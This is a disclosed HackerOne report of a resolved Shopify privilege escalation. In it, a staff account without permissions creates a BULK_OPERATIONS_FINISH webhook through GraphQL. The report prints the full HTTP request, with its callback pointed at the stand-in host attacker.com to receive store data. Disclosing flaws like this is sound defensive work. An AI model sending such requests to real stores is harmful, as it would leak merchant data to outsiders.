---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1350095'
original_report_id: '1350095'
title: Staff  can use BULK_OPERATIONS_FINISH webhook topic using Graphql without permissions
  all
weakness: Privilege Escalation
team_handle: shopify
created_at: '2021-09-24T00:40:47.902Z'
disclosed_at: '2021-12-04T01:04:09.592Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 21
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# Staff  can use BULK_OPERATIONS_FINISH webhook topic using Graphql without permissions all

## Metadata

- HackerOne Report ID: 1350095
- Weakness: Privilege Escalation
- Program: shopify
- Disclosed At: 2021-12-04T01:04:09.592Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I am reporting this because it looks like an authorization bug in GraphQL.
A Staff member with no  permissions on a Shopify Store may be able to create Webhooks with the webhookSubscriptionCreate mutation on
BULK_OPERATIONS_FINISH webhook topic.

POST /admin/internal/web/graphql/core?operation=PageStaff HTTP/1.1
Host: yinvi-nacho-2.myshopify.com
Connection: close

{
"operationName": "webhookSubscriptionCreate",
"variables": {
"topic": "BULK_OPERATIONS_FINISH",
"webhookSubscription": {
"callbackUrl": "https://attacker.com"
}
},
"query": "mutation webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!, $webhookSubscription: WebhookSubscriptionInput!) {\r\n  webhookSubscriptionCreate(topic: $topic, webhookSubscription: $webhookSubscription) {\r\n    userErrors {\r\n      field\r\n      message\r\n    }\r\n    webhookSubscription {\r\n      id\r\n    }\r\n  }\r\n}"
}

## Impact

Staff  with no permissions may be able to access or perform unauthorized actions  on  bulk-operation  https://shopify.dev/api/usage/bulk-operations/queries

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
